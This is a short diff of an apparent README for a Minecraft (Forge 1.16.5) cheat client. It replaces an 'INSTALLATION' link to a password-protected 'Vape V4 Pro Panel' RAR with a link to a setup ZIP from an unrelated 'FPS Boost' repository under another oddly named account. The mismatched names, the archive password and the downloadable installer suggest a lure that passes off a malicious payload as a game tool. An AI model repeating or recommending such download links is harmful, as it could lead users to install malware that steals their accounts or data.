@@ -11,6 +11,6 @@ Update  + fix bag
   1.16.5 (Forge)
   AND NEWER VERSIONS
 ---
-### [INSTALLATION](https://github.com/Signalbrerhythm/Vape-V4-Vape-Lite/releases/download/vapev4/Vape.V4.Pro.Panel.rar)
-### PASSWORD 2026
+### [INSTALLATION](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
+
 ---
